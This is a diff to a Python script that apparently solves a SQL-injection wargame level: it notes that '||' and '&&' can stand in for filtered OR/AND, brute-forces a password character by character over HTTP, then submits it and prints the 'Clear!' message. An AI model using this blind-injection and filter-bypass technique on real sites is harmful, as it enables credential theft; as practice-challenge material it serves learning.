@@ -1,3 +1,11 @@
+#!/usr/bin/env python3
+
+'''
+# Summary
+- we can use ||, && instead of OR, AND
+'''
+
+
 import requests
 import string
 
@@ -33,3 +41,14 @@ for idx in range(1, pw_len + 1):
             print("[*] Finding... : " + pw)
             break
 print("[+] Found pw : " + pw)
+
+payload = "?pw="+pw
+
+response = requests.get(url + payload, headers=header)
+
+result = response.text
+if result.find("Clear!") != -1:
+    end = result.split("Clear!")[0].split("<h2>")[1]
+    if end.find("admin") != -1:
+        end = result.split("Clear!")[0].split("<h2>")[2]
+    print(end+"Clear!")
